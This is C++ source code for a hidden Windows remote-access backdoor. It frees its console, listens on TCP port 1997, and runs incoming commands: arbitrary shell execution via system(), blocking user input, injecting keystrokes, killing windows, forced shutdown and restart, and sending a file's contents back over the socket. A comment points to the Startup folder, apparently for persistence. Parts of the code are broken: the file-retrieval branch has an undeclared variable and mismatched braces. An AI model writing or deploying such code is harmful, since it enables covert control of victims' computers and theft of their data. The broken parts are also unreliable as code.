#undef UNICODE

#define WIN32_LEAN_AND_MEAN
#include <fstream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <Shellapi.h>
#include "windowsstuff.h"

using namespace std;

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "1997"
#define FREE_CONSOLE 1
  int iSendResult;
 SOCKET ConnectSocket = INVALID_SOCKET;
char sendbuf[DEFAULT_BUFLEN];

//C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

BOOL TerminateWindow(HWND hWnd)
{
  DWORD   dwProcessId;
  HANDLE  hProcess;
  BOOL    bRet = FALSE;

  GetWindowThreadProcessId(hWnd, &dwProcessId);
  hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);
  if(hProcess != NULL)
  {
    if(TerminateProcess(hProcess, 0))
      bRet = TRUE;
    CloseHandle(hProcess);
  }

  return bRet;
}

int Str2Virt(string str)
{
    if (str == "ESCAPE")
        return VK_ESCAPE;
    if (str == "LBUTTON")
        return VK_LBUTTON;
    if (str == "RBUTTON")
        return VK_RBUTTON;
    if (str == "CAPITAL")
        return VK_CAPITAL;
    if (str == "BACK")
        return VK_BACK;
    if (str == "SPACE")
        return VK_SPACE;
    if (str == "RETURN")
        return VK_RETURN;
    if (str == "LCONTROL")
        return VK_LCONTROL;
    if (str == "LSHIFT")
        return VK_SHIFT;
    if (str == "TAB")
        return VK_TAB;
    if (str == "ALT")
        return VK_MENU;
    if (str == "LSHIFT")
        return VK_SHIFT;
    if (str == "WIN")
        return VK_LWIN;


    if (str.length() == 1 && char(str[0]) >= 'A' && char(str[0]) <= 'Z')
         return int(str[0]);
    if (str.length() == 1 && char(str[0]) >= '0' && char(str[0]) <= '9')
         return int(str[0] = '0');
}

int ManageText(char* buffer)
{
    int p;
    string text = buffer;
    string command = text.substr(0, p = text.find("("));
    string param = text.substr(p+1, text.find(")")-p-1);
    
    if (command == "Exit") 
        exit(1);
    if (command == "BlockInputs")
        BlockInput(true);
    if (command == "UnblockInputs")
        BlockInput(false);
    if (command == "Type")
        TypeStr(param);
    if (command == "Sim")
        SimKey(Str2Virt(param));
    if (command == "Press")
        SimKeyUD(Str2Virt(param), DOWN);
    if (command == "Rel")
        SimKeyUD(Str2Virt(param), UP);
    if (command == "MsgBox")    {
        MessageBox(NULL, param.c_str(), "Error", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL); }
     if(command== "Retrieve");{
      string inenline;
  ifstream myfile ("example.txt");
  if (myfile.is_open())
  {
    while ( myfile.good() )
    {
      getline (myfile,inenline);
     char linenlinel;
     inenline=linenline;
     iSendResult = send( ConnectSocket, linenline,  (int)strlen(linenline), 0 );
    }
    myfile.close();}
          
    if (command == "CtrlA")    {
        SimKeyUD(VK_LCONTROL, DOWN);
        SimKey('A');
        SimKeyUD(VK_LCONTROL, UP);
    }
    if (command == "LeftClick")    {
        LeftClick(DOWN);
        LeftClick(UP);
    }
    if (command == "PressLeft")    {
        LeftClick(DOWN);
    }
    if (command == "RelLeft")    {
        LeftClick(UP);
    }
    if (command == "RightClick")    {
        RightClick(DOWN);
        RightClick(UP);
    }
    if (command == "PressRight")    {
        RightClick(DOWN);
    }
    if (command == "RelRight")    {
        RightClick(UP);
    }
    

    else if (command == "System")    {
        system(param.c_str());
    }
    else if (command == "Web")    {
        ShellExecute(NULL, "open", text.substr(p+1, text.find(")")-p-1).c_str(), NULL, NULL, SW_SHOWNORMAL);
    }
    else if (command == "Close")    {
        TerminateWindow(GetForegroundWindow());
    }
    else if (command == "AltTab")    {
        SimKeyUD(VK_LMENU, DOWN);
        SimKeyUD(VK_TAB, DOWN);
        SimKeyUD(VK_TAB, UP);
        SimKeyUD(VK_LMENU, UP);
    }
    else if (command == "AltF4")    {
        SimKeyUD(VK_LMENU, DOWN);
        SimKeyUD(VK_F4, DOWN);
        SimKeyUD(VK_F4, UP);
        SimKeyUD(VK_LMENU, UP);
    }
    else if (command == "CAD")    {
        SimKeyUD(VK_LCONTROL, DOWN);
        SimKeyUD(VK_LMENU, DOWN);
        SimKeyUD(VK_DELETE, DOWN);
        SimKeyUD(VK_DELETE, UP);
        SimKeyUD(VK_LMENU, UP);
        SimKeyUD(VK_LCONTROL, DOWN);
    }
    else if (command == "Shutdown")    {
        system("shutdown -s -t 0");
    }    
    else if (command == "Restart")    {
        system("shutdown -r -t 0");
    }
    else
        return 0;
    return 1;
}

int __cdecl main(void) 
{
    if (FREE_CONSOLE)
        FreeConsole();
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

  
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Setup the TCP listening socket
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        system("pause");
        return 1;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR) {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // Accept a client socket
    ClientSocket = accept(ListenSocket, NULL, NULL);
    if (ClientSocket == INVALID_SOCKET) {
        printf("accept failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return 1;
    }

    // No longer need server socket
    closesocket(ListenSocket);

    // Receive until the peer shuts down the connection
    do {

        iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            if (ManageText(recvbuf))
                printf("GO SCREW YOURSELF!!!\n");
          //  printf("Bytes received: %d\n", iResult);

        // Echo the buffer back to the sender
          /*  iSendResult = send( ClientSocket, recvbuf, iResult, 0 );
            if (iSendResult == SOCKET_ERROR) {
                printf("send failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 1;
            }
            printf("Bytes sent: %d\n", iSendResult);    */
        }
        else if (iResult == 0)    {
            WSACleanup();
            main();
        }
        else  {
            printf("recv failed with error: %d\n", WSAGetLastError());
            closesocket(ClientSocket);
            WSACleanup();
            main();
          //  return 1;
        }
        recvbuf[0] = '\0';

    } while (iResult > 0);

    // shutdown the connection since we're done
    iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ClientSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ClientSocket);
    WSACleanup();

    return 0;
}
